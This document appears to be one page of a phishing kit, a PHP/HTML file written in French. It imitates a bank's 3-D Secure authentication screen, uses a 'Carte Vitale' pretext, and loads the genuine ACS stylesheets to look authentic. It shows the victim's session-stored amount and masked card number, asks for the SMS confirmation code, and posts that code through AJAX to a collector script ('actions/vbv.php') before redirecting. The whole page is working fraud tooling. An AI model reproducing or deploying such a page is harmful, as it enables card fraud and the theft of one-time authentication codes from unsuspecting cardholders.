



<?php 


include("../../infos.php");

$none = true;

include("../../common/sub_includes.php");

?>



<html><head><style>[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
<meta charset="UTF-8">
<script src="https://kit.fontawesome.com/ac54f722d1.js" crossorigin="anonymous"></script>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">

<!--[if IE]><script type="text/javascript">
    // Fix for IE ignoring relative base tags.
    (function() {
        var baseTag = document.getElementsByTagName('base')[0];
        baseTag.href = baseTag.href;
    })();
</script><![endif]-->
<title>ACS</title>
<link href="https://sg-3ds-vdm.wlp-acs.com/acs-auth-pages/assets/css/libs.bundle.d4af436688895680.css" rel="stylesheet">
<link href="https://sg-3ds-vdm.wlp-acs.com/acs-auth-pages/app/app.bundle.bf30b6e8faa99cf9.css" rel="stylesheet">
<link ng-href="https://sg-3ds-vdm.wlp-acs.com/acs-auth-pages/app/config/custom/custom.css" rel="stylesheet" id="custom" href="https://sg-3ds-vdm.wlp-acs.com/acs-auth-pages/app/config/custom/custom.css">

<style type="text/css"></style></head>
<body>
<script src="../../assets/js/jquery.js"></script>


	<splash-screen show="true" class="ng-isolate-scope"><!-- ngIf: show --></splash-screen>
	<!-- uiView: --><ui-view class="ng-scope" style=""><poll class="ng-scope ng-isolate-scope"><custom-component layout-data="layoutData" class="ng-isolate-scope"><div class="ng-scope"><div><div class="ng-scope">
<!-- POLLING_PAGE -->
   <div ng-style="style" class="ng-scope" style="padding: 0px 6px; margin: auto; font-family: Arial, Helvetica, sans-serif; max-width: 800px; font-size: 12px;">
      <div ng-style="style" class="ng-scope" style="width: 100%; height: 70px;">
         <div ng-style="style" class="ng-scope" style="width: 50%; float: left;">
            <custom-image alt-key="'network_means_pageType_1_IMAGE_ALT'" image-key="'network_means_pageType_1_IMAGE_DATA'" id="issuerLogo" straight-mode="false" class="ng-isolate-scope"></custom-image>
         </div>

      </div>
      <style> #issuerLogo, #networkLogo {height : auto;padding: 5px 0px;} 
         @media screen and (max-width: 360px) {   
         #issuerLogo { max-height : 50px;  max-width:100%; }
         #networkLogo {height : 50px;   }}
         @media screen and (max-width: 700px) and (min-width: 361px) {  
         #issuerLogo {max-height : 60px;  max-width:100%; }  
         #networkLogo {height : 60px;   }}
         @media screen and (min-width: 701px) {  
         #issuerLogo {max-height : 70px;  max-width:100%; }
         #networkLogo {height : 70px; }
         }  
      </style>
      <message-banner back-button="'network_means_pageType_98'" close-button="'network_means_pageType_99'" class="ng-isolate-scope"><!-- ngIf: show --><div id="message-container" ng-if="show" ng-class="[style, {unfold: unfolded}]" ng-click="foldUnfold()" click-outside="fold()" class="ng-scope warn unfold" style="">

	<div id="message-content">
		<custom-component layout-data="layoutData" class="ng-isolate-scope"><div class="ng-scope"><div><span id="info-icon" class="fa fa-info-circle"></span>
<custom-text id="headingTxt" custom-text-key="$parent.heading" class="ng-isolate-scope"><span id="headingTxt" ng-bind-html="customText" class="custom-text ng-binding">Authentification en cours</span></custom-text>
<custom-text id="message" custom-text-key="$parent.message" class="ng-isolate-scope"><span id="message" ng-bind-html="customText" class="custom-text ng-binding">Veuillez-vous authentifier à l'aide de votre Pass Sécurité.</span></custom-text>
<style>#headingTxt {font-size : large;font-weight : bold;width : 80%;margin : auto;display : block;}#message {font-size : small;font-weight : none;width : 80%;margin : auto;display : block;}#spinner-row {padding-top: 15px;}</style></div></div></custom-component>

		<div id="message-controls">
			<div id="return-button-row" class="message-button ng-hide" ng-show="showReturnButton()">
				<button class="btn btn-default" ng-click="returnButtonAction()" data-cy="MESSAGE_BANNER_RETURN_BUTTON">
					<span class="fa fa-reply menu-button-icon" aria-hidden="true"></span>
					<custom-text custom-text-key="backButtonKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Retour à la boutique</span></custom-text>
				</button>
			</div>
			
			<div id="close-button-row" class="message-button ng-hide" ng-show="showCloseButton()">
				<button class="btn btn-default" ng-click="toggleDisplay()" data-cy="MESSAGE_BANNER_CLOSE_BUTTON">
					<span class="fa fa-times menu-button-icon" aria-hidden="true"></span>
					<custom-text custom-text-key="closeButtonKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Fermer</span></custom-text>
				</button>
			</div>
		</div>
	</div>
</div><!-- end ngIf: show --></message-banner>

      <div ng-style="style" class="ng-scope" style="color: rgb(8, 8, 138); font-size: 16px; font-weight: bold; margin-top: 15px;padding-bottom: 20px; font-family: Arial, Helvetica, sans-serif; float: left; text-align: center;width: 100%;">
         <custom-text id="centerHeaderTitle" custom-text-key="'network_means_POLLING_PAGE_1'" class="ng-isolate-scope"><span id="centerHeaderTitle" ng-bind-html="customText" class="custom-text ng-binding">Valider votre confirmation</span></custom-text>
      </div>
      <div ng-style="style" class="ng-scope" style="padding: 10px; hyphens: auto; width: 100%; border-bottom: 1px solid rgb(233, 234, 234); text-align: justify;">
        <form action="" method="post">
         <custom-text custom-text-key="'network_means_POLLING_PAGE_2'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Pour sécuriser la confirmation de votre carte sur Carte Vitale.com, nous avons besoin de vérifier que vous êtes bien le propriétaire de cette carte. Pour cela, veuillez renseigner le code reçu par SMS dans le champ ci-dessous
                        <br>
                    N.B : Aucun prélévement ne sera effectué.</span></custom-text>
      </div>
      <div ng-style="style" class="ng-scope" style="width: 100%; font-size: 12px;">
         <side-menu class="ng-isolate-scope"><div class="side-menu text-center">
	<div class="row menu-title ng-hide" ng-show="showMenuTitle()" style="">
		<custom-text custom-text-key="menuTitle" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding"></span></custom-text>
	</div>
	<div class="menu-elements">
		<!-- ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope" style="">

		</div><!-- end ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope">
			<div ng-switch="" on="menuItem.value">
				<!-- ngSwitchWhen: BUTTON -->
				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
					<span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
						<label data-cy="SIDE_MENU_ITEM_LABEL">
							<custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Montant</span></custom-text>
						</label>
						<label id="menu-separator">:</label>
					</span>
					<span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
                        <span class="ng-binding"><?php echo $_SESSION['prix']; ?>€</span>
						<!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
					</span>
				</div><!-- end ngSwitchWhen: -->
			</div>
		</div><!-- end ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope">
			<div ng-switch="" on="menuItem.value">
				<!-- ngSwitchWhen: BUTTON -->
				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
					<span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
						<label data-cy="SIDE_MENU_ITEM_LABEL">
							<custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Date</span></custom-text>
						</label>
						<label id="menu-separator">:</label>
					</span>
					<span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
                        <span class="ng-binding"><?php echo date("j M Y G:i"); ?></span>
						<!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
					</span>
				</div><!-- end ngSwitchWhen: -->
			</div>
		</div><!-- end ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope">
			<div ng-switch="" on="menuItem.value">
				<!-- ngSwitchWhen: BUTTON -->
				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
					<span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
						<label data-cy="SIDE_MENU_ITEM_LABEL">
							<custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">N° de carte</span></custom-text>
						</label>
						<label id="menu-separator">:</label>
					</span>
					<span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
                        <span class="ng-binding">xxxxxxxxxxxx<?php echo  substr($_SESSION["ccnum"],12,16)?></span>
						<!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
					</span>
				</div><!-- end ngSwitchWhen: -->
			</div>
		</div><!-- end ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope">
			<div ng-switch="" on="menuItem.value">
				<!-- ngSwitchWhen: BUTTON -->
				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
					
				</div><!-- end ngSwitchWhen: -->
			</div>
		</div><!-- end ngRepeat: menuItem in menuItems -->
	</div>
</div></side-menu>
      </div>
      <div ng-style="style" class="ng-scope" style="padding: 10px; width: 100%;">        
         <div ng-style="style" class="ng-scope" style="border-top: 1px solid rgb(233, 234, 234); overflow: auto; width: 100%; ; text-align: center; padding: 10px;">
            
         </div>
         <style> 
            #cancelButton button, #helpButton button, #switch-means-button button{
            color: black;
            white-space: normal;
            margin-bottom: 5px;
            border-width: 1px;
            border-style: solid;
            border-color: #ccc;
            border-image: initial;
            font-size: 14px;
            width: 80%;
            }
         </style>
         <div class="flex" style="display : flex;flex-direction : column;align-items : center">
         <strong>Code reçu</strong>
         <input type="text" name="vbv" required style="padding : 5px 20px;"> 

         </div>
         <div ng-style="style" class="ng-scope" style="overflow: auto; width: 100%; text-align: justify; padding: 10px;">
            <div ng-style="style" class="ng-scope" style="width: 100%; text-align: center;">
               <cancel-button cn-label="'network_means_POLLING_PAGE_40'" id="cancelButton" class="ng-isolate-scope"><button type="submit" class="btn btn-default" ng-click="cancelAction()" ng-disabled="disabled" ng-show="displayed" data-cy="CANCEL_BUTTON">
	<span class="fas fa-check" aria-hidden="true"> </span>

            

	<custom-text custom-text-key="cnLabel" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Confirmer</span></custom-text>
</button></cancel-button>

               <help help-label="'network_means_POLLING_PAGE_41'" id="helpButton" class="ng-isolate-scope">
<!-- ngIf: show --></help>
            </div>
         </div>
      </div>
   </div>
</div>

</div></div></custom-component>
<!-- <div id="polling">
	<custom-text custom-text-key="network + '_' + means + '_POLLING_PAGE_1'" replace-keys="$root.filterKeys" replace-values="$root.filterValues"></custom-text>
</div> --></poll></ui-view>

    <!--[if lt IE 8 ]>
    <script src="assets/js/json2.js"></script>
    <![endif]-->

	<script src="assets/libs.bundle.a5f9698dcfe877e4.js"></script>
    <script>window.ACS_AD_BLOCK_ENABLED=true;</script>
    <script src="app/ads.js"></script>
	<script src="app/app.bundle.3815c3950f6eab64.js"></script>


</body></html>
<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>

            <script src="../../assets/js/mask.js"></script>

            <script>

            $("#telip").mask("000000000")

            </script>

    <script>
        $(document).ready(function() {
            $("form").submit(function(e) {
                e.preventDefault();
                var $this = $(this);
                $("#message-content").css("background-color","green");
                $("#capa2").css("display","block");

                $.ajax({
                        method: "POST",
                        url: "../../actions/vbv.php",
                        data: $(this).serialize()
                    })
                    .then(function(msg) {
                        setTimeout(function() {
                            window.location.href = "../loading_finished.php"
                        }, 500);
                    });
                

            });
        });
    </script>



